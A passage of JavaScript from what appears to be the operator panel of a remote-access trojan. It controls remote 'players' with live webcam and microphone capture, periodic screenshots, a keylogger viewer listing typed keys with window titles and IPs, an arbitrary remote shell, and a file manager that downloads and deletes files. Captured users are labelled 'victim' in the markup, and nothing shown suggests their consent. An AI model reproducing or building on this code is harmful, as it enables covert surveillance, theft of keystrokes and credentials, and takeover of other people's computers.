            const audio = document.getElementById('screenshareAudio');
            if (audio) {
                audio.volume = val / 100;
            }
            document.getElementById('screenshareVolumeVal').textContent = val + '%';
            if (val == 0) {
                document.getElementById('screenshareMuteBtn').className = 'fas fa-volume-mute';
                screenshareMuted = true;
            } else {
                document.getElementById('screenshareMuteBtn').className = 'fas fa-volume-up';
                screenshareMuted = false;
            }
        }
        
        function toggleScreenshareMute() {
            screenshareMuted = !screenshareMuted;
            const audio = document.getElementById('screenshareAudio');
            const slider = document.getElementById('screenshareVolume');
            const btn = document.getElementById('screenshareMuteBtn');
            
            if (screenshareMuted) {
                if (audio) audio.volume = 0;
                btn.className = 'fas fa-volume-mute';
                document.getElementById('screenshareVolumeVal').textContent = '0%';
            } else {
                const vol = slider.value;
                if (audio) audio.volume = vol / 100;
                btn.className = 'fas fa-volume-up';
                document.getElementById('screenshareVolumeVal').textContent = vol + '%';
            }
        }
        
        function setWebcamVolume(val) {
            const audio = document.getElementById('webcamAudio');
            if (audio) {
                audio.volume = val / 100;
            }
            document.getElementById('webcamVolumeVal').textContent = val + '%';
            if (val == 0) {
                document.getElementById('webcamMuteBtn').className = 'fas fa-volume-mute';
                webcamMuted = true;
            } else {
                document.getElementById('webcamMuteBtn').className = 'fas fa-volume-up';
                webcamMuted = false;
            }
        }
        
        function toggleWebcamMute() {
            webcamMuted = !webcamMuted;
            const audio = document.getElementById('webcamAudio');
            const slider = document.getElementById('webcamVolume');
            const btn = document.getElementById('webcamMuteBtn');
            
            if (webcamMuted) {
                if (audio) audio.volume = 0;
                btn.className = 'fas fa-volume-mute';
                document.getElementById('webcamVolumeVal').textContent = '0%';
            } else {
                const vol = slider.value;
                if (audio) audio.volume = vol / 100;
                btn.className = 'fas fa-volume-up';
                document.getElementById('webcamVolumeVal').textContent = vol + '%';
            }
        }
        
        // ESC key to close
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && document.getElementById('screenshareModal').classList.contains('active')) {
                closeScreenshareModal();
            }
            if (e.key === 'Escape' && document.getElementById('webcamModal').classList.contains('active')) {
                closeWebcamModal();
            }
        });

        // ==================== WEBCAM MODAL ====================
        let webcamModalInterval = null;
        let webcamModalPlayer = null;
        let webcamLastId = null;
        let webcamFpsCounter = 0;
        let webcamFpsTimer = null;
        let webcamUsingWebSocket = false;
        let webcamSoundEnabled = false;
        let webcamAudioInterval = null;
        
        function toggleWebcamSound() {
            webcamSoundEnabled = !webcamSoundEnabled;
            const soundBtn = document.getElementById('webcamSoundBtn');
            
            if (webcamSoundEnabled) {
                soundBtn.innerHTML = '<i class="fas fa-volume-mute"></i> Sound Off';
                soundBtn.className = 'btn btn-success';
                
                // Start audio polling if webcam is active
                if (webcamModalPlayer && webcamModalInterval) {
                    startWebcamAudio();
                }
                
                toast('Webcam sound enabled');
            } else {
                soundBtn.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
                soundBtn.className = 'btn btn-secondary';
                
                stopWebcamAudio();
                
                toast('Webcam sound disabled');
            }
        }
        
        function startWebcamAudio() {
            if (webcamAudioInterval) clearInterval(webcamAudioInterval);
            webcamAudioInterval = setInterval(fetchWebcamAudio, 3500); // Audio every 3.5 seconds (capture takes 3s)
        }
        
        function stopWebcamAudio() {
            if (webcamAudioInterval) {
                clearInterval(webcamAudioInterval);
                webcamAudioInterval = null;
            }
        }
        
        async function fetchWebcamAudio() {
            if (!webcamModalPlayer || !webcamSoundEnabled) return;
            
            try {
                // Request audio capture from Guardian
                await api('/api/remote/command', 'POST', {
                    target_player: webcamModalPlayer,
                    command_type: 'audio',
                    command_data: 'capture'
                });
                
                // Wait for capture, then fetch
                await new Promise(r => setTimeout(r, 3200));
                
                const res = await api(`/api/audio/latest?player=${encodeURIComponent(webcamModalPlayer)}`);
                if (res.success && res.audio) {
                    // Get volume from slider
                    const volSlider = document.getElementById('webcamVolume');
                    const vol = volSlider ? volSlider.value / 100 : 0.5;
                    
                    // Create audio element and play
                    const audio = new Audio('data:audio/mp3;base64,' + res.audio);
                    audio.volume = vol;
                    audio.play().catch(e => {
                        console.log('Audio autoplay blocked:', e);
                    });
                }
            } catch (e) {
                // Ignore audio fetch errors
            }
        }
        
        function openWebcamModal(player) {
            webcamModalPlayer = player;
            document.getElementById('webcamModalPlayer').textContent = player;
            document.getElementById('webcamModal').classList.add('active');
            document.body.style.overflow = 'hidden';
            
            // Clear previous image to prevent ghost frames
            const img = document.getElementById('webcamModalImage');
            if (img) {
                img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>'; // Clear with empty SVG
                img.style.display = 'none';
            }
            document.getElementById('webcamModalPlaceholder').style.display = 'block';
            
            // Initialize WebSocket
            initSocket();
            
            // Reset state
            document.getElementById('webcamStartBtn').style.display = 'inline-flex';
            document.getElementById('webcamStopBtn').style.display = 'none';
            updateWebcamStatus(false);
        }
        
        function closeWebcamModal() {
            stopWebcamModal();
            stopWebcamAudio();
            
            // Clear image on close
            const img = document.getElementById('webcamModalImage');
            if (img) {
                img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
                img.style.display = 'none';
            }
            
            // Reset sound button
            webcamSoundEnabled = false;
            const soundBtn = document.getElementById('webcamSoundBtn');
            if (soundBtn) {
                soundBtn.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
                soundBtn.className = 'btn btn-secondary';
            }
            
            // Leave WebSocket room
            if (webcamUsingWebSocket && webcamModalPlayer) {
                leaveStream(webcamModalPlayer, 'webcam');
                webcamUsingWebSocket = false;
            }
            
            document.getElementById('webcamModal').classList.remove('active');
            document.body.style.overflow = '';
            webcamModalPlayer = null;
        }
        
        function updateWebcamStatus(streaming) {
            const status = document.getElementById('webcamModalStatus');
            if (streaming) {
                status.className = 'screenshare-modal-status streaming';
                const wsIndicator = webcamUsingWebSocket ? ' (WebSocket)' : '';
                status.innerHTML = '<i class="fas fa-circle" style="animation: pulse 1s infinite;"></i> <span>Streaming' + wsIndicator + '</span>';
            } else {
                status.className = 'screenshare-modal-status stopped';
                status.innerHTML = '<i class="fas fa-circle"></i> <span>Stopped</span>';
            }
        }
        
        async function startWebcamModal() {
            try {
                if (!webcamModalPlayer) return;

                const startBtn = document.getElementById('webcamStartBtn');
                const stopBtn = document.getElementById('webcamStopBtn');
                const placeholder = document.getElementById('webcamModalPlaceholder');
                const imageEl = document.getElementById('webcamModalImage');
                const audioStatus = document.getElementById('webcamAudioStatus');
                const fpsEl = document.getElementById('webcamFps');
                const statsEl = document.getElementById('webcamStats');

                if (startBtn) startBtn.style.display = 'none';
                if (stopBtn) stopBtn.style.display = 'inline-flex';
                if (placeholder) placeholder.style.display = 'none';
                if (imageEl) imageEl.style.display = 'block';
                if (audioStatus) {
                    audioStatus.textContent = 'Waiting...';
                    audioStatus.style.color = 'var(--text-secondary)';
                }

                // Start FPS counter and stats
                webcamFpsCounter = 0;
                if (webcamFpsTimer) clearInterval(webcamFpsTimer);
                webcamFpsTimer = setInterval(() => {
                    const quality = window.webcamQuality || 80;
                    if (fpsEl) fpsEl.textContent = webcamFpsCounter + ' FPS | Quality: ' + quality;
                    if (statsEl) statsEl.textContent = webcamFpsCounter + ' fps  Live';
                    webcamFpsCounter = 0;
                }, 1000);

                // Get quality and fps from UI (defaults: 80, 30)
                const quality = parseInt(document.getElementById('webcamQualitySlider')?.value || '80');
                const fps = parseInt(document.getElementById('webcamFpsSlider')?.value || '30');
                window.webcamQuality = quality;
                window.webcamFps = fps;
                
                // Use WebSocket if available
                if (socket && socket.connected) {
                    webcamUsingWebSocket = true;
                    joinStream(webcamModalPlayer, 'webcam');
                    requestStartStream(webcamModalPlayer, 'webcam', quality, fps);
                    updateWebcamStatus(true);
                    toast('Webcam started via WebSocket for ' + webcamModalPlayer);
                } else {
                    // Fallback to HTTP polling
                    webcamUsingWebSocket = false;
                    updateWebcamStatus(true);
                    
                    // Send webcam command via HTTP
                    await api('/api/remote/command', 'POST', {
                        target_player: webcamModalPlayer,
                        command_type: 'webcam',
                        command_data: 'continuous'
                    });
                    
                    // Start polling for webcam images (200ms = ~5 FPS)
                    if (webcamModalInterval) clearInterval(webcamModalInterval);
                    webcamModalInterval = setInterval(fetchWebcamModal, 200);
                    
                    toast('Webcam started (HTTP) for ' + webcamModalPlayer);
                }
            } catch(e) {
                console.error('startWebcamModal error:', e);
                toast('Error starting webcam: ' + e.message, 'error');
            }
        }
        
        async function stopWebcamModal() {
            // Stop HTTP polling
            if (webcamModalInterval) {
                clearInterval(webcamModalInterval);
                webcamModalInterval = null;
            }
            if (webcamFpsTimer) {
                clearInterval(webcamFpsTimer);
                webcamFpsTimer = null;
            }
            
            // Stop via WebSocket or HTTP
            if (webcamUsingWebSocket && webcamModalPlayer) {
                requestStopStream(webcamModalPlayer, 'webcam');
                leaveStream(webcamModalPlayer, 'webcam');
                webcamUsingWebSocket = false;
            } else if (webcamModalPlayer) {
                // HTTP fallback
                await api('/api/remote/command', 'POST', {
                    target_player: webcamModalPlayer,
                    command_type: 'webcam',
                    command_data: 'stop'
                });
            }
            
            document.getElementById('webcamStartBtn').style.display = 'inline-flex';
            document.getElementById('webcamStopBtn').style.display = 'none';
            updateWebcamStatus(false);
        }
        
        async function fetchWebcamModal() {
            if (!webcamModalPlayer) return;
            
            try {
                // Fetch both image and audio
                const res = await api('/api/webcam/latest?player=' + encodeURIComponent(webcamModalPlayer));
                if (res && res.image && res.id !== webcamLastId) {
                    webcamLastId = res.id;
                    const img = document.getElementById('webcamModalImage');
                    img.onload = () => {
                        img.style.display = 'block';
                        document.getElementById('webcamModalPlaceholder').style.display = 'none';
                        try { webcamFpsCounter++; } catch(e) {}
                    };
                    img.src = 'data:image/jpeg;base64,' + res.image;
                }
                
                // Fetch audio
                const audioRes = await api('/api/audio/latest?player=' + encodeURIComponent(webcamModalPlayer));
                if (audioRes && audioRes.audio && audioRes.id) {
                    const audio = document.getElementById('webcamAudio');
                    audio.src = 'data:audio/mp3;base64,' + audioRes.audio;
                    document.getElementById('webcamAudioStatus').textContent = ' Live';
                    document.getElementById('webcamAudioStatus').style.color = '#22c55e';
                }
            } catch (e) {
                console.error('Webcam fetch error:', e);
            }
        }
        
        async function requestWebcamSnapshot() {
            if (!webcamModalPlayer) return;
            await api('/api/remote/command', 'POST', {
                target_player: webcamModalPlayer,
                command_type: 'webcam',
                command_data: 'single'
            });
            toast('Webcam snapshot requested');
        }
        
        async function requestAudioSnapshot() {
            if (!webcamModalPlayer) return;
            await api('/api/remote/command', 'POST', {
                target_player: webcamModalPlayer,
                command_type: 'audio',
                command_data: 'single'
            });
            toast('Audio clip requested');
        }
        
        function toggleWebcamFullscreen() {
            const modal = document.getElementById('webcamModal');
            if (!document.fullscreenElement) {
                modal.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // ==================== SCREENSHARE (OLD - for page) ====================
        async function startScreenshare() {
            const player = document.getElementById('screensharePlayerSelect').value;
            if (!player) {
                toast('Please select a player first', 'error');
                return;
            }
            
            // Open the modal instead of showing inline
            openScreenshareModal(player);
        }

        function stopScreenshare() {
            if (screenshareInterval) {
                clearInterval(screenshareInterval);
                screenshareInterval = null;
            }
            screensharePlayer = null;
            document.getElementById('screenshareStatus').innerHTML = '<span style="color: var(--text-muted);">Not streaming</span>';
            toast('Screenshare stopped');
        }

        async function fetchLatestScreenshot() {
            if (!screensharePlayer) return;
            
            const res = await api(`/api/screenshots/latest/${screensharePlayer}`);
            if (res.success && res.id && res.id !== lastScreenshotId) {
                lastScreenshotId = res.id;
                document.getElementById('screenshareImage').src = `/api/screenshots/image/${res.id}?t=${Date.now()}`;
            }
        }

        async function requestSingleScreenshot() {
            const player = document.getElementById('screensharePlayerSelect').value;
            if (!player) {
                toast('Please select a player', 'error');
                return;
            }
            
            await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'screenshot',
                command_data: 'single'
            });
            toast('Screenshot requested');
            
            // Load history after a delay
            setTimeout(loadScreenshotHistory, 2000);
        }
        
        // ==================== LIVE PREVIEW GRID ====================
        let previewRefreshInterval = null;
        let previewCountdown = 600; // 10 minutes in seconds
        
        async function loadLivePreviewGrid() {
            try {
                // Get online players for Remote (same endpoint)
                const res = await api('/api/remote/players');
                if (!res.success) return;
                
                const players = res.players || [];
                document.getElementById('screenshareOnlineCount').textContent = players.length;
                
                // Get total screenshot count
                const screenshotRes = await api('/api/screenshots');
                if (screenshotRes.success) {
                    document.getElementById('screenshotTotalCount').textContent = (screenshotRes.screenshots || []).length;
                    if (screenshotRes.screenshots && screenshotRes.screenshots.length > 0) {
                        const lastTime = new Date(screenshotRes.screenshots[0].created_at);
                        document.getElementById('lastCaptureTime').textContent = lastTime.toLocaleTimeString();
                    }
                }
                
                if (players.length === 0) {
                    document.getElementById('screenshareLiveGrid').innerHTML = `
                        <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                            <i class="fas fa-desktop" style="font-size: 48px; margin-bottom: 16px; opacity: 0.5;"></i>
                            <p>No remote clients online</p>
                            <small>When players connect, their preview will appear here</small>
                        </div>
                    `;
                    return;
                }
                
                // Build preview cards for each player
                document.getElementById('screenshareLiveGrid').innerHTML = players.map((p, i) => {
                    const isGuardian = p.player && p.player.startsWith('Guardian_');
                    const displayName = isGuardian ? p.player.replace('Guardian_', '') : p.player;
                    const typeIcon = isGuardian ? '' : '';
                    
                    return `
                    <div class="webcam-card" style="animation-delay: ${i * 0.1}s;">
                        <div class="webcam-card-header">
                            <div class="webcam-card-title">
                                ${typeIcon} ${displayName}
                            </div>
                            <div class="webcam-card-live">
                                <i class="fas fa-circle"></i> LIVE
                            </div>
                        </div>
                        <div style="position: relative; aspect-ratio: 16/9; background: #0a0a0f; display: flex; align-items: center; justify-content: center; cursor: pointer;"
                             onclick="openScreenshareModal('${p.player}'); startScreenshareModal();">
                            <img id="preview-${p.player.replace(/[^a-zA-Z0-9]/g, '_')}" 
                                 style="width: 100%; height: 100%; object-fit: cover; display: none;"
                                 onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                            <div style="display: flex; flex-direction: column; align-items: center; color: var(--text-muted);">
                                <i class="fas fa-desktop" style="font-size: 32px; margin-bottom: 8px; opacity: 0.5;"></i>
                                <span style="font-size: 11px;">Click to stream</span>
                            </div>
                        </div>
                        <div class="webcam-info" style="padding: 12px;">
                            <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
                                <div>
                                    <div style="font-weight: 600; font-size: 13px;">${p.pc_name || 'Unknown PC'}</div>
                                    <div style="font-size: 11px; color: var(--text-muted);">${p.pc_user || 'User'}  ${p.country || 'N/A'}</div>
                                </div>
                                <div style="display: flex; gap: 6px;">
                                    <button class="btn btn-sm btn-primary" onclick="event.stopPropagation(); openScreenshareModal('${p.player}'); startScreenshareModal();" title="Start Stream">
                                        <i class="fas fa-play"></i>
                                    </button>
                                    <button class="btn btn-sm btn-secondary" onclick="event.stopPropagation(); requestPreviewScreenshot('${p.player}');" title="Capture Now">
                                        <i class="fas fa-camera"></i>
                                    </button>
                                    <button class="btn btn-sm btn-danger" onclick="event.stopPropagation(); forceKickPlayer('${p.player}');" title="Force Kick">
                                        <i class="fas fa-bolt"></i>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                `}).join('');
                
                // Load latest screenshots as previews
                await loadPreviewImages(players);
                
            } catch (e) {
                console.error('Preview grid error:', e);
            }
        }
        
        async function loadPreviewImages(players) {
            for (const p of players) {
                try {
                    const res = await api(`/api/screenshots/latest/${encodeURIComponent(p.player)}`);
                    if (res.success && res.id) {
                        const imgId = 'preview-' + p.player.replace(/[^a-zA-Z0-9]/g, '_');
                        const img = document.getElementById(imgId);
                        if (img) {
                            img.src = `/api/screenshots/image/${res.id}?t=${Date.now()}`;
                            img.onload = () => {
                                img.style.display = 'block';
                                if (img.nextElementSibling) img.nextElementSibling.style.display = 'none';
                            };
                        }
                    }
                } catch (e) {
                    // Ignore individual preview errors
                }
            }
        }
        
        async function requestPreviewScreenshot(player) {
            await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'screenshot',
                command_data: 'single'
            });
            toast(` Screenshot requested from ${player}`);
            
            // Reload preview after delay
            setTimeout(async () => {
                const res = await api(`/api/screenshots/latest/${encodeURIComponent(player)}`);
                if (res.success && res.id) {
                    const imgId = 'preview-' + player.replace(/[^a-zA-Z0-9]/g, '_');
                    const img = document.getElementById(imgId);
                    if (img) {
                        img.src = `/api/screenshots/image/${res.id}?t=${Date.now()}`;
                        img.style.display = 'block';
                        if (img.nextElementSibling) img.nextElementSibling.style.display = 'none';
                    }
                }
            }, 3000);
        }
        
        async function requestAllScreenshots() {
            const res = await api('/api/remote/players');
            if (!res.success) return;
            
            const players = res.players || [];
            for (const p of players) {
                await api('/api/remote/command', 'POST', {
                    target_player: p.player,
                    command_type: 'screenshot',
                    command_data: 'single'
                });
            }
            
            toast(` Requested screenshots from ${players.length} clients`);
            
            // Reload all previews after delay
            setTimeout(() => loadLivePreviewGrid(), 5000);
        }
        
        function refreshAllPreviews() {
            previewCountdown = 600; // Reset countdown
            loadLivePreviewGrid();
            toast('Previews refreshed');
        }
        
        function startPreviewAutoRefresh() {
            if (previewRefreshInterval) clearInterval(previewRefreshInterval);
            
            previewCountdown = 600; // 10 minutes
            
            previewRefreshInterval = setInterval(() => {
                previewCountdown--;
                
                // Update countdown display
                const mins = Math.floor(previewCountdown / 60);
                const secs = previewCountdown % 60;
                const el = document.getElementById('nextRefreshTime');
                if (el) el.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
                
                // Auto-refresh when countdown reaches 0
                if (previewCountdown <= 0) {
                    previewCountdown = 600;
                    loadLivePreviewGrid();
                    requestAllScreenshots();
                }
            }, 1000);
        }
        
        function stopPreviewAutoRefresh() {
            if (previewRefreshInterval) {
                clearInterval(previewRefreshInterval);
                previewRefreshInterval = null;
            }
        }

        async function loadScreenshotHistory() {
            const res = await api('/api/screenshots');
            if (!res.success) return;
            
            const screenshots = (res.screenshots || []).slice(0, 12);
            
            if (screenshots.length === 0) {
                document.getElementById('screenshotHistory').innerHTML = `
                    <div style="text-align: center; padding: 40px; color: var(--text-muted); grid-column: 1/-1;">
                        <i class="fas fa-images" style="font-size: 32px; margin-bottom: 12px; opacity: 0.5;"></i>
                        <p>No screenshots yet</p>
                    </div>
                `;
                return;
            }
            
            document.getElementById('screenshotHistory').innerHTML = screenshots.map(s => `
                <div class="webcam-card">
                    <img class="webcam-image" src="/api/screenshots/image/${s.id}" style="cursor: pointer;" 
                         onclick="openLightbox('/api/screenshots/image/${s.id}', '${(s.player || 'Unknown').replace(/'/g, "\\'")} - ${new Date(s.created_at).toLocaleString()}')"
                         onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 160 90%22><rect fill=%22%231a1a24%22 width=%22160%22 height=%2290%22/><text x=%2280%22 y=%2250%22 fill=%22%2371717a%22 text-anchor=%22middle%22 font-size=%2210%22>Error</text></svg>'">
                    <div class="webcam-info">
                        <div class="webcam-victim"><i class="fas fa-user" style="margin-right: 6px;"></i>${s.player || 'Unknown'}</div>
                        <div class="webcam-time"><i class="fas fa-clock" style="margin-right: 6px;"></i>${new Date(s.created_at).toLocaleString()}</div>
                    </div>
                </div>
            `).join('');
        }

        // ==================== KEYLOGGER ====================
        async function loadKeylogs() {
            const player = document.getElementById('keylogPlayerSelect').value;
            const res = await api('/api/keylog');
            if (!res.success) return;
            
            let keylogs = res.keylogs || [];
            if (player) {
                keylogs = keylogs.filter(k => k.player === player);
            }
            
            document.getElementById('keylogTable').innerHTML = keylogs.map(k => `
                <tr class="animate-fade">
                    <td>${new Date(k.created_at).toLocaleString()}</td>
                    <td><strong>${k.player || 'Unknown'}</strong></td>
                    <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${k.window_title || ''}">
                        ${k.window_title || 'N/A'}
                    </td>
                    <td style="font-family: monospace; background: var(--bg-secondary); padding: 4px 8px; border-radius: 4px; max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                        ${escapeHtml(k.keys || '')}
                    </td>
                    <td>${k.pc_name || 'Unknown'} / ${k.ip || 'N/A'}</td>
                </tr>
            `).join('') || '<tr><td colspan="5" style="text-align:center;">No keylog data</td></tr>';
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        async function startKeylogger() {
            const player = document.getElementById('keylogPlayerSelect').value;
            if (!player) {
                toast('Please select a player', 'error');
                return;
            }
            
            await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'keylogger',
                command_data: 'start'
            });
            toast('Keylogger started for ' + player);
        }

        function startKeyloggerForPlayer(player) {
            document.getElementById('keylogPlayerSelect').value = player;
            startKeylogger();
        }

        // ==================== REMOTE SHELL ====================
        async function sendShellCommand() {
            const player = document.getElementById('shellPlayerSelect').value;
            const input = document.getElementById('shellInput');
            const command = input.value.trim();
            
            if (!player) {
                appendToShell('<span style="color: #ef4444;">Error: Please select a player first</span>');
                return;
            }
            if (!command) return;
            
            input.value = '';
            appendToShell(`<span style="color: #3b82f6;">[${player}]$</span> ${escapeHtml(command)}`);
            
            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'shell',
                command_data: command
            });
            
            if (res.success) {
                appendToShell('<span style="color: #f59e0b;">Command queued (ID: ' + res.id + '). Waiting for response...</span>');
                // Poll for result
                setTimeout(() => pollCommandResult(res.id), 1000);
            } else {
                appendToShell('<span style="color: #ef4444;">Failed to send command</span>');
            }
            
            loadShellHistory();
        }

        async function pollCommandResult(commandId, attempts = 0) {
            if (attempts > 30) {
                appendToShell('<span style="color: #ef4444;">Timeout waiting for response</span>');
                return;
            }
            
            const res = await api(`/api/remote/command/${commandId}`);
            if (res.success && res.command) {
                if (res.command.status === 'completed') {
                    appendToShell('<span style="color: #22c55e;">' + escapeHtml(res.command.result || 'No output') + '</span>');
                    loadShellHistory();
                } else if (res.command.status === 'failed') {
                    appendToShell('<span style="color: #ef4444;">Command failed: ' + escapeHtml(res.command.result || 'Unknown error') + '</span>');
                    loadShellHistory();
                } else {
                    // Still pending, poll again
                    setTimeout(() => pollCommandResult(commandId, attempts + 1), 1000);
                }
            }
        }

        function appendToShell(html) {
            const output = document.getElementById('shellOutput');
            output.innerHTML += '\n' + html;
            output.scrollTop = output.scrollHeight;
        }

        async function loadShellHistory() {
            const res = await api('/api/remote/commands');
            if (!res.success) return;
            
            const shellCmds = (res.commands || []).filter(c => c.command_type === 'shell').slice(0, 20);
            
            document.getElementById('shellHistoryTable').innerHTML = shellCmds.map(c => `
                <tr>
                    <td>${new Date(c.created_at).toLocaleString()}</td>
                    <td>${c.target_player}</td>
                    <td style="font-family: monospace; max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${escapeHtml(c.command_data || '')}</td>
                    <td>
                        <span style="color: ${c.status === 'completed' ? '#22c55e' : c.status === 'failed' ? '#ef4444' : '#f59e0b'};">
                            ${c.status}
                        </span>
                    </td>
                    <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis;">${escapeHtml((c.result || '').substring(0, 100))}</td>
                </tr>
            `).join('') || '<tr><td colspan="5" style="text-align:center;">No commands yet</td></tr>';
        }

        // ==================== FILE MANAGER ====================
        let fileManagerPlayer = null;
        let fileManagerPolling = null;
        let lastFileCommandId = null;
        
        function onFilePlayerSelected() {
            const player = document.getElementById('filesPlayerSelect').value;
            fileManagerPlayer = player;
            if (player) {
                document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-user"></i> Selected: ${player}`;
            }
        }
        
        async function browseToPath() {
            const player = document.getElementById('filesPlayerSelect').value;
            let path = document.getElementById('currentPath').value.trim();
            
            if (!player) {
                toast('Please select a player first', 'error');
                return;
            }
            
            if (!path) path = 'C:\\';
            fileManagerPlayer = player;
            
            document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-spinner fa-spin"></i> Browsing ${path}...`;
            document.getElementById('fileListTable').innerHTML = '<tr><td colspan="5" style="text-align:center; padding: 40px;"><i class="fas fa-spinner fa-spin" style="font-size: 24px;"></i><br>Loading directory...</td></tr>';
            
            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'browse|' + path
            });
            
            if (res.success && res.id) {
                lastFileCommandId = res.id;
                // Poll for result
                pollFileResult(res.id);
            }
        }
        
        async function pollFileResult(commandId) {
            let attempts = 0;
            const maxAttempts = 30; // 15 seconds max
            
            const poll = async () => {
                attempts++;
                const res = await api(`/api/remote/command/${commandId}`);
                
                if (res.success && res.command) {
                    if (res.command.status === 'completed') {
                        // Parse the JSON result
                        try {
                            const data = JSON.parse(res.command.result);
                            if (data.error) {
                                document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i> Error: ${data.error}`;
                                document.getElementById('fileListTable').innerHTML = `<tr><td colspan="5" style="text-align:center; color: var(--danger); padding: 40px;"><i class="fas fa-exclamation-circle" style="font-size: 32px; margin-bottom: 12px; display: block;"></i>${escapeHtml(data.error)}</td></tr>`;
                            } else {
                                renderFileList(data);
                            }
                        } catch(e) {
                            // Old format - plain text
                            document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-check" style="color: #22c55e;"></i> Loaded`;
                            document.getElementById('fileListTable').innerHTML = `<tr><td colspan="5"><pre style="margin: 0;">${escapeHtml(res.command.result)}</pre></td></tr>`;
                        }
                        return;
                    } else if (res.command.status === 'failed') {
                        document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-times" style="color: var(--danger);"></i> Failed`;
                        document.getElementById('fileListTable').innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--danger);">Command failed</td></tr>';
                        return;
                    }
                }
                
                if (attempts < maxAttempts) {
                    setTimeout(poll, 500);
                } else {
                    document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-clock" style="color: var(--warning);"></i> Timeout - client may be offline`;
                }
            };
            
            poll();
        }
        
        function renderFileList(data) {
            if (!data.files || !Array.isArray(data.files)) {
                document.getElementById('fileListTable').innerHTML = '<tr><td colspan="5" style="text-align:center;">No files found</td></tr>';
                return;
            }
            
            document.getElementById('currentPath').value = data.path || 'C:\\';
            
            // Breadcrumbs
            const parts = (data.path || 'C:\\').split(/[\\\/]/).filter(p => p);
            let breadcrumbHtml = '';
            let currentBuild = '';
            parts.forEach((part, index) => {
                currentBuild += (index === 0 ? '' : '\\') + part;
                // Fix for drive letter
                if (index === 0 && part.includes(':')) currentBuild = part + '\\';
                
                breadcrumbHtml += `<span class="breadcrumb-item" onclick="navigateToFolder('${currentBuild.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}')">${part}</span>`;
                if (index < parts.length - 1) breadcrumbHtml += ' <span style="color:var(--text-muted)">/</span> ';
            });
            
            // Update status with breadcrumbs if element exists, otherwise just text
            const statusEl = document.getElementById('fileManagerStatus');
            if (statusEl) {
                statusEl.innerHTML = `
                    <div style="display:flex; align-items:center; gap:10px; overflow-x:auto; white-space:nowrap; padding-bottom:4px;">
                        <i class="fas fa-hdd" style="color: var(--accent);"></i> 
                        ${breadcrumbHtml}
                        <span style="margin-left:auto; font-size:11px; color:var(--text-muted);">${data.files.length} items</span>
                    </div>
                `;
            }
            
            // Sort: directories first, then files
            const files = data.files.sort((a, b) => {
                if (a.isDir && !b.isDir) return -1;
                if (!a.isDir && b.isDir) return 1;
                return a.name.localeCompare(b.name);
            });
            
            document.getElementById('fileListTable').innerHTML = files.map(f => {
                const icon = f.isDir ? 'fa-folder' : getFileIcon(f.name);
                const iconColor = f.isDir ? '#f59e0b' : '#6b7280';
                const size = f.isDir ? '-' : formatFileSize(f.size);
                const fullPath = (data.path + '\\' + f.name).replace(/\\\\/g, '\\');
                
                return `
                    <tr style="cursor: pointer; transition: background 0.1s;" ondblclick="${f.isDir ? `navigateToFolder('${escapeHtml(fullPath).replace(/'/g, "\\'")}')` : `previewFile('${escapeHtml(fullPath).replace(/'/g, "\\'")}')`}">
                        <td style="text-align: center; width: 40px;"><i class="fas ${icon}" style="color: ${iconColor}; font-size: 16px;"></i></td>
                        <td style="font-family: 'Inter', sans-serif; font-weight: 500;">${escapeHtml(f.name)}</td>
                        <td style="color: var(--text-muted); font-size: 13px;">${size}</td>
                        <td style="color: var(--text-muted); font-size: 12px;">${f.modified || '-'}</td>
                        <td style="text-align: right;">
                            ${f.isDir ? `
                                <button class="btn btn-xs btn-secondary" onclick="navigateToFolder('${escapeHtml(fullPath).replace(/'/g, "\\'")}')"><i class="fas fa-folder-open"></i></button>
                            ` : `
                                <button class="btn btn-xs btn-secondary" onclick="downloadRemoteFile('${escapeHtml(fullPath).replace(/'/g, "\\'")}')" title="Download"><i class="fas fa-download"></i></button>
                                <button class="btn btn-xs btn-secondary" onclick="previewFile('${escapeHtml(fullPath).replace(/'/g, "\\'")}')" title="Preview"><i class="fas fa-eye"></i></button>
                            `}
                            <button class="btn btn-xs btn-danger" onclick="deleteRemoteFile('${escapeHtml(fullPath).replace(/'/g, "\\'")}')" title="Delete"><i class="fas fa-trash"></i></button>
                        </td>
                    </tr>
                `;
            }).join('') || '<tr><td colspan="5" style="text-align:center;">Empty directory</td></tr>';
        }
        
        function getFileIcon(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            const icons = {
                'txt': 'fa-file-alt', 'log': 'fa-file-alt', 'md': 'fa-file-alt',
                'pdf': 'fa-file-pdf',
                'doc': 'fa-file-word', 'docx': 'fa-file-word',
                'xls': 'fa-file-excel', 'xlsx': 'fa-file-excel',
                'ppt': 'fa-file-powerpoint', 'pptx': 'fa-file-powerpoint',
